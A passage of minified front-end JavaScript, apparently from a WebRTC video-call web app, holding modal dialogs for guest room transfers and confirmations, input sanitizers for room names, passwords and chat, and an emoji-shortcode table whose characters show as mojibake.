pid=event.target.dataset.pid;result=document.getElementById("input_"+pid).value,document.getElementById("modal_"+pid).remove(),document.getElementById("modalBackdrop_"+pid).remove(),Prompts[pid].resolve()}}));try{document.getElementById("submit_"+promptID).addEventListener("click",(function(event){var pid=event.target.dataset.pid;time?(result=parseInt(document.getElementById("input_"+pid+"_sec").value)+60*parseInt(document.getElementById("input_"+pid).value),document.getElementById("countup_"+promptID).checked&&(result=0)):result=document.getElementById("input_"+pid).value,document.getElementById("modal_"+pid).remove(),document.getElementById("modalBackdrop_"+pid).remove(),Prompts[pid].resolve()}))}catch(e){}try{document.getElementById("cancel_"+promptID).addEventListener("click",(function(event){var pid=event.target.dataset.pid;document.getElementById("modal_"+pid).remove(),document.getElementById("modalBackdrop_"+pid).remove(),Prompts[pid].resolve()}))}catch(e){}try{document.getElementById("close_"+promptID).addEventListener("click",(function(event){var pid=event.target.dataset.pid;document.getElementById("modal_"+pid).remove(),document.getElementById("modalBackdrop_"+pid).remove(),Prompts[pid].resolve()}))}catch(e){}getById("modal_"+promptID).addEventListener("click",(function(e){return e.stopPropagation(),!1}))})),result}async function promptTransfer(value=null,bcmode=null,updateurl=null,queueMode=null){var result={roomid:null};return session.beepToNotify&&playtone(),await new Promise(((resolve,reject)=>{var promptID="pid_"+Math.random().toString(36).substr(2,9);Prompts[promptID]={},Prompts[promptID].resolve=resolve,Prompts[promptID].reject=reject;var zindex=30+document.querySelectorAll(".promptModal").length,inputText="<span style='font-size:1.2em'>"+getTranslation("transfer-guest-to-room").replace("\n","</span><br /><span>")+"</span>";inputText=inputText.replace(/\n/g,"<br />"),modalTemplate=`<div id="modal_${promptID}" class="promptModal" style="z-index:${zindex+2}">\t\n\t\t\t\t<div class="promptModalInner">\n\t\t\t\t\t<span id="close_${promptID}" class='modalClose' data-pid="${promptID}">Ã—</span>\n\t\t\t\t\t<span class='promptModalMessage'>${inputText}</span>\n\t\t\t\t\t<input id="input_${promptID}" data-pid="${promptID}"  type="text" autocorrect="off" autocapitalize="none" class="largeTextEntry" />\n\t\t\t\t\t<span class='promptModalLabel'><input id="private_${promptID}" data-pid="${promptID}"  type="checkbox" title="Note: this won't work fully if using obfuscated links" /> Allow the guest to rejoin the transfer room on their own</span>\n\t\t\t\t\t<span class='promptModalLabel'><input id="broadcast_${promptID}" data-pid="${promptID}"  type="checkbox" /> Guest will arrive in the new room in <i>broadcast</i> mode</span>\n\t\t\t\t\t<span class='promptModalLabel'><input id="queued_${promptID}" data-pid="${promptID}"  type="checkbox" /> Guest will arrive in the new room in <i>queue</i> mode</span>\n\t\t\t\t\t<button id="submit_${promptID}" data-pid="${promptID}" style="width:120px; background-color: #fff; position: relative;border: 1px solid #999; margin: 0 0 0 55px;" data-translate='ok'>âœ” OK</button>\n\t\t\t\t\t<button id="cancel_${promptID}" data-pid="${promptID}" style="width:120px; background-color: #fff; position: relative;border: 1px solid #999; margin: 0;" data-translate='cancel'>âŒ Cancel</button>\n\t\t\t\t</div>\n\t\t\t</div>\n\t\t\t<div id="modalBackdrop_${promptID}" class="modalBackdrop" style="z-index:${zindex+1}"></div>`,document.body.insertAdjacentHTML("beforeend",modalTemplate),document.getElementById("input_"+promptID).focus(),null!==value&&(document.getElementById("input_"+promptID).value=value),null!==bcmode&&(document.getElementById("broadcast_"+promptID).checked=bcmode),null!==queueMode&&(document.getElementById("queued_"+promptID).checked=queueMode),null!==updateurl&&(document.getElementById("private_"+promptID).checked=updateurl),document.getElementById("input_"+promptID).addEventListener("keyup",(function(event){if("Enter"===event.key){var pid=event.target.dataset.pid,room=document.getElementById("input_"+pid).value,updateurl=document.getElementById("private_"+pid).checked,broadcast=document.getElementById("broadcast_"+pid).checked,queue=document.getElementById("queued_"+pid).checked;document.getElementById("modal_"+pid).remove(),document.getElementById("modalBackdrop_"+pid).remove(),Prompts[pid].resolve(),result={roomid:room,updateurl:updateurl,broadcast:broadcast,queue:queue}}})),document.getElementById("submit_"+promptID).addEventListener("click",(function(event){var pid=event.target.dataset.pid,room=document.getElementById("input_"+pid).value,updateurl=document.getElementById("private_"+pid).checked,broadcast=document.getElementById("broadcast_"+pid).checked,queue=document.getElementById("queued_"+pid).checked;document.getElementById("modal_"+pid).remove(),document.getElementById("modalBackdrop_"+pid).remove(),Prompts[pid].resolve(),result={roomid:room,updateurl:updateurl,broadcast:broadcast,queue:queue}})),document.getElementById("cancel_"+promptID).addEventListener("click",(function(event){var pid=event.target.dataset.pid;document.getElementById("modal_"+pid).remove(),document.getElementById("modalBackdrop_"+pid).remove(),Prompts[pid].resolve()})),document.getElementById("close_"+promptID).addEventListener("click",(function(event){var pid=event.target.dataset.pid;document.getElementById("modal_"+pid).remove(),document.getElementById("modalBackdrop_"+pid).remove(),Prompts[pid].resolve()})),getById("modal_"+promptID).addEventListener("click",(function(e){return e.stopPropagation(),!1}))})),result}function youveBeenTransferred(){getChatMessage(getTranslation("you-have-been-transferred"),label=!1,director=!1,overlay=!0),getById("head2").innerHTML=getTranslation("room-changed"),miniTranslate(getById("head2"),"room-changed"),session.director&&(getById("head4").innerHTML=getTranslation("you-are-no-longer-a-co-director")),session.label?document.title=session.label+" - "+getTranslation("transferred"):document.title=getTranslation("transferred"),hideHomeCheck()}function youveBeenActivated(){if(3==session.queueType)for(var UUID in getById("overlayMsgs").innerText="",session.pcs)session.pcs[UUID].needsPublishing&&session.initialPublish(UUID);else 4==session.queueType&&(getById("overlayMsgs").innerText="");getChatMessage(getTranslation("you-have-been-activated"),label=!1,director=!1,overlay=!0),hideHomeCheck()}function youreWaitingToBeActivated(){getChatMessage(getTranslation("you-not-yet-activated"),label=!1,director=!1,overlay=!0),hideHomeCheck()}async function confirmAlt(inputText,block=!1){var result=null;return session.beepToNotify&&playtone(),await new Promise(((resolve,reject)=>{var promptID="pid_"+Math.random().toString(36).substr(2,9);Prompts[promptID]={},Prompts[promptID].resolve=resolve,Prompts[promptID].reject=reject;var zindex=30+document.querySelectorAll(".promptModal").length;if(block)var backdropClass="opaqueBackdrop";else backdropClass="modalBackdrop";inputText=(inputText="<span style='font-size:1.2em'>"+inputText.replace("\n","</span><br /><span>")+"</span>").replace(/\n/g,"<br />"),modalTemplate=`<div id="modal_${promptID}" class="promptModal" style="z-index:${zindex+2}">\t\n\t\t\t\t<div class="promptModalInner">\n\t\t\t\t\t<span id="close_${promptID}" class='modalClose' data-pid="${promptID}">Ã—</span>\n\t\t\t\t\t<span class='promptModalMessage' style='margin: 0 0 15px 0;'>${inputText}</span>\n\t\t\t\t\t<button id="submit_${promptID}" data-pid="${promptID}" style="width:120px; background-color: #fff; position: relative;border: 1px solid #999; margin: 0 0 0 55px;" data-translate='ok'>âœ” OK</button>\n\t\t\t\t\t<button id="cancel_${promptID}" data-pid="${promptID}" style="width:120px; background-color: #fff; position: relative;border: 1px solid #999; margin: 0;" data-translate='cancel'>âŒ Cancel</button>\n\t\t\t\t</div>\n\t\t\t</div>\n\t\t\t<div id="modalBackdrop_${promptID}" class="${backdropClass}" style="z-index:${zindex+1}"></div>`,document.body.insertAdjacentHTML("beforeend",modalTemplate),document.getElementById("submit_"+promptID).focus(),document.getElementById("submit_"+promptID).addEventListener("click",(function(event){var pid=event.target.dataset.pid;result=!0,document.getElementById("modalBackdrop_"+pid).remove(),document.getElementById("modal_"+pid).remove(),Prompts[pid].resolve()})),document.getElementById("cancel_"+promptID).addEventListener("click",(function(event){var pid=event.target.dataset.pid;document.getElementById("modalBackdrop_"+pid).remove(),document.getElementById("modal_"+pid).remove(),Prompts[pid].resolve()})),document.getElementById("close_"+promptID).addEventListener("click",(function(event){var pid=event.target.dataset.pid;document.getElementById("modalBackdrop_"+pid).remove(),document.getElementById("modal_"+pid).remove(),Prompts[pid].resolve()})),getById("modal_"+promptID).addEventListener("click",(function(e){return e.stopPropagation(),!1}))})),result}var modalTimeout=null;function warnUser(message,timeout=!1,sanitize=!0){if(message){document.getElementById("modalBackdrop")&&(getById("alertModal").innerHTML="",getById("alertModal").remove(),getById("modalBackdrop").innerHTML="",getById("modalBackdrop").remove()),zindex=31+document.querySelectorAll(".alertModal").length;try{sanitize&&(message=sanitizeChat(message,2e3)),message=message.replace(/\n/g,"<br />")}catch(e){errorlog(message)}modalTemplate=`<div class="alertModal" id="alertModal"  style="z-index:${zindex+2}">\t\n\t\t<div class="alertModalInner">\n\t\t\t<span class='modalClose' onclick="closeModal()">Ã—</span>\n\t\t\t<span id="alertModalMessage" class='alertModalMessage'>${message}</span>\n\t\t</div>\n\t</div>\n\t<div id="modalBackdrop" style="z-index:${zindex+1}"></div>`,document.body.insertAdjacentHTML("beforeend",modalTemplate),document.getElementById("modalBackdrop").addEventListener("click",closeModal),clearTimeout(modalTimeout),timeout&&(modalTimeout=setTimeout(closeModal,timeout)),getById("alertModal").addEventListener("click",(function(e){return e.stopPropagation(),!1}))}}function closeModal(ele=!1){clearTimeout(modalTimeout);try{getById("modalBackdrop").innerHTML="",getById("modalBackdrop").remove(),getById("alertModal").innerHTML="",getById("alertModal").remove(),getById("promptModal").innerHTML="",getById("promptModal").remove(),query(".modalBackdrop").innerHTML="",query(".modalBackdrop").remove(),ele&&ele.innerHTML&&ele.remove&&(ele.innerHTML="",ele.remove())}catch(e){warnlog(e)}session.timeoutTriggered&&(session.warnUserTriggered=!1)}var sanitizeStreamID=function(streamID){(streamID=streamID.trim()).length<1&&(streamID=session.generateStreamID(8),session.cleanOutput||warnUser(getTranslation("no-streamID-provided")+streamID,!1,!1));var streamID_sanitized=streamID.replace(/[\W]+/g,"_");return streamID!==streamID_sanitized&&(session.cleanOutput||warnUser(getTranslation("alphanumeric-only"),!1,!1)),streamID_sanitized.length>44&&(streamID_sanitized=streamID_sanitized.substring(0,50),session.cleanOutput||warnUser(getTranslation("stream-id-too-long"),!1,!1)),streamID_sanitized},checkStrength=function(string){return!!string.match(/^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{7,30}$/)||string.length>20},checkStrengthRoom=function(){var result1=checkStrength(getById("videoname1").value),result2=getById("passwordRoom").value.length,target=getById("securityLevelRoom");target.style.display="block",target.innerHTML=result1?result2?"<span style='color:green'>"+getTranslation("share-with-trusted")+"</span>":"<span style='color:#e67202;'>"+getTranslation("pass-recommended")+"</span>":"<span style='color:red'>"+getTranslation("insecure-room-name")+"</span> "+getTranslation("allowed-chars")+": <i>A-Z, a-z, 0-9, _</i>"},emojiShortCodes={":joy:":"ğŸ˜‚",":heart:":"â¤ï¸",":heart_eyes:":"ğŸ˜",":sob:":"ğŸ˜­",":blush:":"ğŸ˜Š",":unamused:":"ğŸ˜’",":two_hearts:":"ğŸ’•",":weary:":"ğŸ˜©",":ok_hand:":"ğŸ‘Œ",":pensive:":"ğŸ˜”",":smirk:":"ğŸ˜",":grin:":"ğŸ˜",":wink:":"ğŸ˜‰",":thumbsup:":"ğŸ‘",":pray:":"ğŸ™",":relieved:":"ğŸ˜Œ",":notes:":"ğŸ¶",":flushed:":"ğŸ˜³",":raised_hands:":"ğŸ™Œ",":see_no_evil:":"ğŸ™ˆ",":cry:":"ğŸ˜¢",":sunglasses:":"ğŸ˜",":v:":"âœŒï¸",":eyes:":"ğŸ‘€",":sweat_smile:":"ğŸ˜…",":sparkles:":"âœ¨",":sleeping:":"ğŸ˜´",":smile:":"ğŸ˜„",":purple_heart:":"ğŸ’œ",":broken_heart:":"ğŸ’”",":blue_heart:":"ğŸ’™",":confused:":"ğŸ˜•",":disappointed:":"ğŸ˜",":yum:":"ğŸ˜‹",":neutral_face:":"ğŸ˜",":sleepy:":"ğŸ˜ª",":clap:":"ğŸ‘",":cupid:":"ğŸ’˜",":heartpulse:":"ğŸ’—",":kiss:":"ğŸ’‹",":point_right:":"ğŸ‘‰",":scream:":"ğŸ˜±",":fire:":"ğŸ”¥",":rage:":"ğŸ˜¡",":smiley:":"ğŸ˜ƒ",":tada:":"ğŸ‰",":tired_face:":"ğŸ˜«",":camera:":"ğŸ“·",":rose:":"ğŸŒ¹",":muscle:":"ğŸ’ª",":skull:":"ğŸ’€",":sunny:":"â˜€ï¸",":yellow_heart:":"ğŸ’›",":triumph:":"ğŸ˜¤",":laughing:":"ğŸ˜†",":sweat:":"ğŸ˜“",":point_left:":"ğŸ‘ˆ",":grinning:":"ğŸ˜€",":mask:":"ğŸ˜·",":green_heart:":"ğŸ’š",":wave:":"ğŸ‘‹",":persevere:":"ğŸ˜£",":heartbeat:":"ğŸ’“",":crown:":"ğŸ‘‘",":innocent:":"ğŸ˜‡",":headphones:":"ğŸ§",":confounded:":"ğŸ˜–",":angry:":"ğŸ˜ ",":grimacing:":"ğŸ˜¬",":star2:":"ğŸŒŸ",":gun:":"ğŸ”«",":raising_hand:":"ğŸ™‹",":thumbsdown:":"ğŸ‘",":dancer:":"ğŸ’ƒ",":musical_note:":"ğŸµ",":no_mouth:":"ğŸ˜¶",":dizzy:":"ğŸ’«",":fist:":"âœŠ",":point_down:":"ğŸ‘‡",":no_good:":"ğŸ™…",":boom:":"ğŸ’¥",":tongue:":"ğŸ‘…",":poop:":"ğŸ’©",":cold_sweat:":"ğŸ˜°",":gem:":"ğŸ’",":ok_woman:":"ğŸ™†",":pizza:":"ğŸ•",":joy_cat:":"ğŸ˜¹",":leaves:":"ğŸƒ",":sweat_drops:":"ğŸ’¦",":penguin:":"ğŸ§",":zzz:":"ğŸ’¤",":walking:":"ğŸš¶",":airplane:":"âœˆï¸",":balloon:":"ğŸˆ",":star:":"â­",":ribbon:":"ğŸ€",":worried:":"ğŸ˜Ÿ",":underage:":"ğŸ”",":fearful:":"ğŸ˜¨",":hibiscus:":"ğŸŒº",":microphone:":"ğŸ¤",":open_hands:":"ğŸ‘",":ghost:":"ğŸ‘»",":palm_tree:":"ğŸŒ´",":nail_care:":"ğŸ’…",":alien:":"ğŸ‘½",":bow:":"ğŸ™‡",":cloud:":"â˜",":soccer:":"âš½",":angel:":"ğŸ‘¼",":dancers:":"ğŸ‘¯",":snowflake:":"â„ï¸",":point_up:":"â˜ï¸",":rainbow:":"ğŸŒˆ",":gift_heart:":"ğŸ’",":gift:":"ğŸ",":beers:":"ğŸ»",":anguished:":"ğŸ˜§",":earth_africa:":"ğŸŒ",":movie_camera:":"ğŸ¥",":anchor:":"âš“",":zap:":"âš¡",":runner:":"ğŸƒ",":sunflower:":"ğŸŒ»",":bouquet:":"ğŸ’",":dog:":"ğŸ¶",":moneybag:":"ğŸ’°",":herb:":"ğŸŒ¿",":couple:":"ğŸ‘«",":fallen_leaf:":"ğŸ‚",":tulip:":"ğŸŒ·",":birthday:":"ğŸ‚",":cat:":"ğŸ±",":coffee:":"â˜•",":dizzy_face:":"ğŸ˜µ",":point_up_2:":"ğŸ‘†",":open_mouth:":"ğŸ˜®",":hushed:":"ğŸ˜¯",":basketball:":"ğŸ€",":ring:":"ğŸ’",":astonished:":"ğŸ˜²",":hear_no_evil:":"ğŸ™‰",":dash:":"ğŸ’¨",":cactus:":"ğŸŒµ",":hotsprings:":"â™¨ï¸",":telephone:":"â˜ï¸",":maple_leaf:":"ğŸ",":princess:":"ğŸ‘¸",":massage:":"ğŸ’†",":love_letter:":"ğŸ’Œ",":trophy:":"ğŸ†",":blossom:":"ğŸŒ¼",":lips:":"ğŸ‘„",":fries:":"ğŸŸ",":doughnut:":"ğŸ©",":frowning:":"ğŸ˜¦",":ocean:":"ğŸŒŠ",":bomb:":"ğŸ’£",":cyclone:":"ğŸŒ€",":rocket:":"ğŸš€",":umbrella:":"â˜”",":couplekiss:":"ğŸ’",":lollipop:":"ğŸ­",":clapper:":"ğŸ¬",":pig:":"ğŸ·",":smiling_imp:":"ğŸ˜ˆ",":imp:":"ğŸ‘¿",":bee:":"ğŸ",":kissing_cat:":"ğŸ˜½",":anger:":"ğŸ’¢",":santa:":"ğŸ…",":earth_asia:":"ğŸŒ",":football:":"ğŸˆ",":guitar:":"ğŸ¸",":panda_face:":"ğŸ¼",":strawberry:":"ğŸ“",":smirk_cat:":"ğŸ˜¼",":banana:":"ğŸŒ",":watermelon:":"ğŸ‰",":snowman:":"â›„",":smile_cat:":"ğŸ˜¸",":eggplant:":"ğŸ†",":crystal_ball:":"ğŸ”®",":calling:":"ğŸ“²",":iphone:":"ğŸ“±",":partly_sunny:":"â›…",":warning:":"âš ï¸",":scream_cat:":"ğŸ™€",":baby:":"ğŸ‘¶",":feet:":"ğŸ¾",":footprints:":"ğŸ‘£",":beer:":"ğŸº",":wine_glass:":"ğŸ·",":video_camera:":"ğŸ“¹",":rabbit:":"ğŸ°",":smoking:":"ğŸš¬",":peach:":"ğŸ‘",":snake:":"ğŸ",":turtle:":"ğŸ¢",":cherries:":"ğŸ’",":kissing:":"ğŸ˜—",":frog:":"ğŸ¸",":milky_way:":"ğŸŒŒ",":closed_book:":"ğŸ“•",":candy:":"ğŸ¬",":hamburger:":"ğŸ”",":bear:":"ğŸ»",":tiger:":"ğŸ¯",":icecream:":"ğŸ¦",":pineapple:":"ğŸ",":ear_of_rice:":"ğŸŒ¾",":syringe:":"ğŸ’‰",":tv:":"ğŸ“º",":pill:":"ğŸ’Š",":octopus:":"ğŸ™",":grapes:":"ğŸ‡",":smiley_cat:":"ğŸ˜º",":cd:":"ğŸ’¿",":cocktail:":"ğŸ¸",":cake:":"ğŸ°",":video_game:":"ğŸ®",":lipstick:":"ğŸ’„",":whale:":"ğŸ³",":cookie:":"ğŸª",":dolphin:":"ğŸ¬",":loud_sound:":"ğŸ”Š",":man:":"ğŸ‘¨",":monkey:":"ğŸ’",":books:":"ğŸ“š",":guardsman:":"ğŸ’‚",":loudspeaker:":"ğŸ“¢",":scissors:":"âœ‚ï¸",":girl:":"ğŸ‘§",":mortar_board:":"ğŸ“",":baseball:":"âš¾ï¸",":woman:":"ğŸ‘©",":fireworks:":"ğŸ†",":stars:":"ğŸŒ ",":mushroom:":"ğŸ„",":pouting_cat:":"ğŸ˜¾",":left_luggage:":"ğŸ›…",":high_heel:":"ğŸ‘ ",":dart:":"ğŸ¯",":swimmer:":"ğŸŠ",":key:":"ğŸ”‘",":bikini:":"ğŸ‘™",":family:":"ğŸ‘ª",":pencil2:":"âœ",":elephant:":"ğŸ˜",":droplet:":"ğŸ’§",":seedling:":"ğŸŒ±",":apple:":"ğŸ",":dollar:":"ğŸ’µ",":book:":"ğŸ“–",":haircut:":"ğŸ’‡",":computer:":"ğŸ’»",":bulb:":"ğŸ’¡",":boy:":"ğŸ‘¦",":tangerine:":"ğŸŠ",":sunrise:":"ğŸŒ…",":poultry_leg:":"ğŸ—",":shaved_ice:":"ğŸ§",":bird:":"ğŸ¦",":eyeglasses:":"ğŸ‘“",":goat:":"ğŸ",":older_woman:":"ğŸ‘µ",":new_moon:":"ğŸŒ‘",":customs:":"ğŸ›ƒ",":house:":"ğŸ ",":full_moon:":"ğŸŒ•",":lemon:":"ğŸ‹",":baby_bottle:":"ğŸ¼",":spaghetti:":"ğŸ",":wind_chime:":"ğŸ",":fish_cake:":"ğŸ¥",":nose:":"ğŸ‘ƒ",":pig_nose:":"ğŸ½",":fish:":"ğŸŸ",":koala:":"ğŸ¨",":ear:":"ğŸ‘‚",":shower:":"ğŸš¿",":bug:":"ğŸ›",":ramen:":"ğŸœ",":tophat:":"ğŸ©",":fuelpump:":"â›½",":horse:":"ğŸ´",":watch:":"âŒš",":monkey_face:":"ğŸµ",":baby_symbol:":"ğŸš¼",":sparkler:":"ğŸ‡",":corn:":"ğŸŒ½",":tennis:":"ğŸ¾",":battery:":"ğŸ”‹",":wolf:":"ğŸº",":moyai:":"ğŸ—¿",":cow:":"ğŸ®",":mega:":"ğŸ“£",":older_man:":"ğŸ‘´",":dress:":"ğŸ‘—",":link:":"ğŸ”—",":chicken:":"ğŸ”",":whale2:":"ğŸ‹",":bento:":"ğŸ±",":pushpin:":"ğŸ“Œ",":dragon:":"ğŸ‰",":hamster:":"ğŸ¹",":golf:":"â›³",":surfer:":"ğŸ„",":mouse:":"ğŸ­",":blue_car:":"ğŸš™",":bread:":"ğŸ",":cop:":"ğŸ‘®",":tea:":"ğŸµ",":bike:":"ğŸš²",":rice:":"ğŸš",":radio:":"ğŸ“»",":baby_chick:":"ğŸ¤",":sheep:":"ğŸ‘",":lock:":"ğŸ”’",":green_apple:":"ğŸ",":racehorse:":"ğŸ",":fried_shrimp:":"ğŸ¤",":volcano:":"ğŸŒ‹",":rooster:":"ğŸ“",":inbox_tray:":"ğŸ“¥",":wedding:":"ğŸ’’",":sushi:":"ğŸ£",":ice_cream:":"ğŸ¨",":tomato:":"ğŸ…",":rabbit2:":"ğŸ‡",":beetle:":"ğŸ",":bath:":"ğŸ›€",":no_entry:":"â›”",":crocodile:":"ğŸŠ",":dog2:":"ğŸ•",":cat2:":"ğŸˆ",":hammer:":"ğŸ”¨",":meat_on_bone:":"ğŸ–",":shell:":"ğŸš",":poodle:":"ğŸ©",":stew:":"ğŸ²",":jeans:":"ğŸ‘–",":honey_pot:":"ğŸ¯",":unlock:":"ğŸ”“",":black_nib:":"âœ’",":snowboarder:":"ğŸ‚",":white_flower:":"ğŸ’®",":necktie:":"ğŸ‘”",":womens:":"ğŸšº",":ant:":"ğŸœ",":city_sunset:":"ğŸŒ‡",":dragon_face:":"ğŸ²",":snail:":"ğŸŒ",":dvd:":"ğŸ“€",":shirt:":"ğŸ‘•",":game_die:":"ğŸ²",":dolls:":"ğŸ",":8ball:":"ğŸ±",":bus:":"ğŸšŒ",":custard:":"ğŸ®",":camel:":"ğŸ«",":curry:":"ğŸ›",":hospital:":"ğŸ¥",":bell:":"ğŸ””",":pear:":"ğŸ",":door:":"ğŸšª",":saxophone:":"ğŸ·",":church:":"â›ª",":bicyclist:":"ğŸš´",":dango:":"ğŸ¡",":office:":"ğŸ¢",":rowboat:":"ğŸš£",":womans_hat:":"ğŸ‘’",":mans_shoe:":"ğŸ‘",":love_hotel:":"ğŸ©",":mount_fuji:":"ğŸ—»",":handbag:":"ğŸ‘œ",":hourglass:":"âŒ›",":trumpet:":"ğŸº",":school:":"ğŸ«",":cow2:":"ğŸ„",":toilet:":"ğŸš½",":pig2:":"ğŸ–",":violin:":"ğŸ»",":credit_card:":"ğŸ’³",":ferris_wheel:":"ğŸ¡",":bowling:":"ğŸ³",":barber:":"ğŸ’ˆ",":purse:":"ğŸ‘›",":rat:":"ğŸ€",":date:":"ğŸ“…",":ram:":"ğŸ",":tokyo_tower:":"ğŸ—¼",":kimono:":"ğŸ‘˜",":ship:":"ğŸš¢",":mag_right:":"ğŸ”",":mag:":"ğŸ”",":fire_engine:":"ğŸš’",":police_car:":"ğŸš“",":black_joker:":"ğŸƒ",":package:":"ğŸ“¦",":calendar:":"ğŸ“†",":horse_racing:":"ğŸ‡",":tiger2:":"ğŸ…",":boot:":"ğŸ‘¢",":ambulance:":"ğŸš‘",":boar:":"ğŸ—",":pound:":"ğŸ’·",":ox:":"ğŸ‚",":rice_ball:":"ğŸ™",":sandal:":"ğŸ‘¡",":tent:":"â›º",":seat:":"ğŸ’º",":taxi:":"ğŸš•",":briefcase:":"ğŸ’¼",":newspaper:":"ğŸ“°",":circus_tent:":"ğŸª",":mens:":"ğŸš¹",":flashlight:":"ğŸ”¦",":foggy:":"ğŸŒ",":bamboo:":"ğŸ",":ticket:":"ğŸ«",":helicopter:":"ğŸš",":minidisc:":"ğŸ’½",":oncoming_bus:":"ğŸš",":melon:":"ğŸˆ",":notebook:":"ğŸ““",":no_bell:":"ğŸ”•",":oden:":"ğŸ¢",":flags:":"ğŸ",":blowfish:":"ğŸ¡",":sweet_potato:":"ğŸ ",":ski:":"ğŸ¿",":construction:":"ğŸš§",":satellite:":"ğŸ“¡",":euro:":"ğŸ’¶",":ledger:":"ğŸ“’",":leopard:":"ğŸ†",":truck:":"ğŸšš",":sake:":"ğŸ¶",":railway_car:":"ğŸšƒ",":speedboat:":"ğŸš¤",":vhs:":"ğŸ“¼",":yen:":"ğŸ’´",":mute:":"ğŸ”‡",":wheelchair:":"â™¿",":paperclip:":"ğŸ“",":atm:":"ğŸ§",":telescope:":"ğŸ”­",":rice_scene:":"ğŸ‘",":blue_book:":"ğŸ“˜",":postbox:":"ğŸ“®",":e-mail:":"ğŸ“§",":mouse2:":"ğŸ",":nut_and_bolt:":"ğŸ”©",":hotel:":"ğŸ¨",":wc:":"ğŸš¾",":green_book:":"ğŸ“—",":tractor:":"ğŸšœ",":fountain:":"â›²",":metro:":"ğŸš‡",":clipboard:":"ğŸ“‹",":no_smoking:":"ğŸš­",":slot_machine:":"ğŸ°",":bathtub:":"ğŸ›",":scroll:":"ğŸ“œ",":station:":"ğŸš‰",":rice_cracker:":"ğŸ˜",":bank:":"ğŸ¦",":wrench:":"ğŸ”§",":bar_chart:":"ğŸ“Š",":minibus:":"ğŸš",":tram:":"ğŸšŠ",":microscope:":"ğŸ”¬",":bookmark:":"ğŸ”–",":pouch:":"ğŸ‘",":fax:":"ğŸ“ ",":sound:":"ğŸ”‰",":chart:":"ğŸ’¹",":floppy_disk:":"ğŸ’¾",":post_office:":"ğŸ£",":speaker:":"ğŸ”ˆ",":japan:":"ğŸ—¾",":mahjong:":"ğŸ€„",":orange_book:":"ğŸ“™",":restroom:":"ğŸš»",":train:":"ğŸš‹",":trolleybus:":"ğŸš",":postal_horn:":"ğŸ“¯",":factory:":"ğŸ­",":train2:":"ğŸš†",":pager:":"ğŸ“Ÿ",":outbox_tray:":"ğŸ“¤",":mailbox:":"ğŸ“«",":light_rail:":"ğŸšˆ",":busstop:":"ğŸš",":file_folder:":"ğŸ“",":card_index:":"ğŸ“‡",":monorail:":"ğŸš",":no_bicycles:":"ğŸš³",":hugging:":"ğŸ¤—",":thinking:":"ğŸ¤”",":nerd:":"ğŸ¤“",":zipper_mouth:":"ğŸ¤",":rolling_eyes:":"ğŸ™„",":upside_down:":"ğŸ™ƒ",":slight_smile:":"ğŸ™‚",":writing_hand:":"âœ",":eye:":"ğŸ‘",":man_in_suit:":"ğŸ•´",":golfer:":"ğŸŒ",":golfer_woman:":"ğŸŒâ€â™€",":anger_right:":"ğŸ—¯",":coffin:":"âš°",":gear:":"âš™",":alembic:":"âš—",":scales:":"âš–",":keyboard:":"âŒ¨",":shield:":"ğŸ›¡",":bed:":"ğŸ›",":ballot_box:":"ğŸ—³",":compression:":"ğŸ—œ",":wastebasket:":"ğŸ—‘",":file_cabinet:":"ğŸ—„",":trackball:":"ğŸ–²",":printer:":"ğŸ–¨",":joystick:":"ğŸ•¹",":hole:":"ğŸ•³",":candle:":"ğŸ•¯",":prayer_beads:":"ğŸ“¿",":amphora:":"ğŸº",":label:":"ğŸ·",":film_frames:":"ğŸ",":level_slider:":"ğŸš",":thermometer:":"ğŸŒ¡",":motorway:":"ğŸ›£",":synagogue:":"ğŸ•",":mosque:":"ğŸ•Œ",":kaaba:":"ğŸ•‹",":stadium:":"ğŸŸ",":desert:":"ğŸœ",":cityscape:":"ğŸ™",":camping:":"ğŸ•",":rosette:":"ğŸµ",":volleyball:":"ğŸ",":medal:":"ğŸ…",":popcorn:":"ğŸ¿",":champagne:":"ğŸ¾",":hot_pepper:":"ğŸŒ¶",":burrito:":"ğŸŒ¯",":taco:":"ğŸŒ®",":hotdog:":"ğŸŒ­",":shamrock:":"â˜˜",":comet:":"â˜„",":turkey:":"ğŸ¦ƒ",":scorpion:":"ğŸ¦‚",":lion_face:":"ğŸ¦",":crab:":"ğŸ¦€",":spider_web:":"ğŸ•¸",":spider:":"ğŸ•·",":chipmunk:":"ğŸ¿",":fog:":"ğŸŒ«",":chains:":"â›“",":pick:":"â›",":stopwatch:":"â±",":ferry:":"â›´",":mountain:":"â›°",":ice_skate:":"â›¸",":skier:":"â›·",":sad:":"ğŸ˜¥",":egg:":"ğŸ¥š",":drum:":"ğŸ¥"};function convertShortcodes(string){if(string.split(":").length>2)for(var i in emojiShortCodes)string.includes(i)&&(string=string.replaceAll(i,emojiShortCodes[i]));return string}var sanitizeChat=function(string,maxlength=500){var temp=document.createElement("div");return temp.innerText=string,temp.innerText=temp.innerHTML,(temp=(temp=temp.textContent||temp.innerText||"").substring(0,Math.min(temp.length,maxlength))).trim()},sanitizeString=function(str){return(str=str.replace(/[^a-z0-9Ã¡Ã©Ã­Ã³ÃºÃ±Ã¼ \.,_-]/gim,"")).trim()},sanitizeLabel=function(string){let temp=document.createElement("div");return temp.innerText=string,temp.innerText=temp.innerHTML,temp=temp.textContent||temp.innerText||"",temp=temp.substring(0,Math.min(temp.length,100)),temp.trim()},sanitizeRoomName=function(roomid){if(""===(roomid=roomid.trim()))return roomid;if(!1===roomid)return roomid;var sanitized=roomid.replace(/[\W]+/g,"_");return roomid.replace(/ /g,"_")!==sanitized&&(session.cleanOutput||warnUser("Info: Only AlphaNumeric characters should be used for the room name.\n\nThe offending characters have been replaced by an underscore")),sanitized.length>30&&(sanitized=sanitized.substring(0,30),session.cleanOutput||warnUser("The Room name should be less than 31 alPhaNuMeric characters long.\n\nWe will trim it to length.")),sanitized},sanitizePassword=function(passwrd){return""===passwrd||!1===passwrd||null===passwrd?passwrd:((passwrd=passwrd.trim()).length<1&&(session.cleanOutput||warnUser("The password provided was blank.")),encodeURIComponent(passwrd))};function checkConnection(){null!==session.ws&&(session.cleanOutput||document.getElementById("qos")&&(getById("logoname").style.display="unset",session.ws&&session.ws.readyState===WebSocket.OPEN?getById("qos").style.color="white":getById("qos").style.color="red"))}function combinedLayout(layout){for(var combined={},i=0;i<layout.length;i++)if(layout[i]){var streamID=null;if("slot"in layout[i])try{streamID=session.currentSlots[parseInt(layout[i].slot)+1]}catch(e){errorlog(e),streamID=null}streamID?combined[streamID]=layout[i]:combined[""]?combined[""].push(layout[i]):combined[""]=[layout[i]]}return combined}function combinedLayoutSimple(layout){var combined={};return 